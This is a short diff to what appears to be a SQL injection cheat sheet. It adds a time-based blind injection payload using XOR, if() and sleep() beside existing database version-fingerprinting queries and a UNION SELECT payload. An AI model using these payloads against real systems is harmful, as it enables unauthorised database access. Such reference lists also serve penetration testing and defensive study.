@@ -124,6 +124,8 @@ SELECT @@version               #mssql mysql
 SELECT version()               #postgresql
 
 +UNION+SELECT+BANNER,+NULL+FROM+v$version-- # oracle
+
+'XOR(if(now()=sysdate(),sleep(5*5),0))OR'
 ```
 ### database contents
 ```sql
